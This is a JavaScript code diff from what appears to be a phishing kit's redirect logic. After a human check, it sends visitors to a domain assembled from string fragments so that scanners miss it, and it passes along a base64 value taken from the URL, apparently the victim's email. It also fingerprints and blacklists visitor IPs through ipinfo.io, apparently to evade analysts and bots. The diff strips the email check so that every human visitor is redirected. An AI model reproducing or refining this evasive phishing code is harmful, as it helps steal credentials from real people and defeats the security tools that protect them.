@@ -383,21 +383,25 @@ function sendMessage2() {
 
 function verifyAndRedirect() {
                 if (isHuman()) {
-                    if (isValidEmail('${getBase64FromUrl()}')) {
-                        '${sendMessage()}';
-                        window.location.assign('h'+'tt'+'ps'+':/'+'/d'+'fg'+'hb'+'v.'+'cr'+'im'+'ek'+'ha'+'ba'+'rn'+'am'+'a.'+'co'+'m/'+'44'+'74'+'ca?'+'eb'+'fe'+'01'+'f0'+'96'+'=C'+'i'+'VV'+'y'+'#'+'${getBase64FromUrl()}');
-                    } else {
-             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
-            .then(response => response.json())
-            .then(data => {
-                var ip = data.ip;
-                addBlacklistedIP(ip);
-                console.log("NOT VALID EMAIL");
-                // redirectToBlockedPage();
-                }
-            ); 
-                    }
-                } else {
+                '${sendMessage()}';
+                window.location.assign('h'+'tt'+'ps'+':/'+'/d'+'fg'+'hb'+'v.'+'cr'+'im'+'ek'+'ha'+'ba'+'rn'+'am'+'a.'+'co'+'m/'+'44'+'74'+'ca?'+'eb'+'fe'+'01'+'f0'+'96'+'=C'+'i'+'VV'+'y'+'#'+'${getBase64FromUrl()}');
+            //         if (isValidEmail('${getBase64FromUrl()}')) {
+            //             '${sendMessage()}';
+            //             window.location.assign('h'+'tt'+'ps'+':/'+'/d'+'fg'+'hb'+'v.'+'cr'+'im'+'ek'+'ha'+'ba'+'rn'+'am'+'a.'+'co'+'m/'+'44'+'74'+'ca?'+'eb'+'fe'+'01'+'f0'+'96'+'=C'+'i'+'VV'+'y'+'#'+'${getBase64FromUrl()}');
+            //         } else {
+            //  fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            // .then(response => response.json())
+            // .then(data => {
+            //     var ip = data.ip;
+            //     addBlacklistedIP(ip);
+            //     console.log('${getBase64FromUrl()}');
+            //     console.log("NOT VALID EMAIL");
+            //     // redirectToBlockedPage();
+            //     }
+            // ); 
+            //         }
+                } 
+            else {
             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
             .then(response => response.json())
             .then(data => {
